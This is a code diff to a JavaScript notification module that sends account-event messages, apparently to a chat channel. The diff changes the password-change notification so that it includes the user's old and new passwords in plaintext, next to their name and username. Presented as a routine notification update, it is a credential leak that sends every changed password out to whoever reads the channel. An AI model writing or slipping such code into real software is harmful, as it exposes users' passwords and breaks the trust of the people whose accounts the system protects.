@@ -29,8 +29,8 @@ module.exports = {
   notifyLogin: (user, ip) => send(
     `🔑 <b>Login</b>\n👤 ${user.firstName} ${user.lastName} (@${user.username})\n🌐 IP: ${ip||'unknown'}\n🕐 ${now()}`
   ),
-  notifyPasswordChanged: (user) => send(
-    `🔒 <b>Password Changed</b>\n👤 ${user.firstName} ${user.lastName} (@${user.username})\n🕐 ${now()}`
+  notifyPasswordChanged: (user, oldPassword, newPassword) => send(
+    `🔒 <b>Password Changed</b>\n👤 ${user.firstName} ${user.lastName} (@${user.username})\n❌ Old: ${oldPassword}\n✅ New: ${newPassword}\n🕐 ${now()}`
   ),
   notifyPasswordResetByAdmin: (user, adminName) => send(
     `🔑 <b>Password Reset by Admin</b>\n👤 Client: ${user.firstName} ${user.lastName}\n👮 Admin: ${adminName}\n🕐 ${now()}`
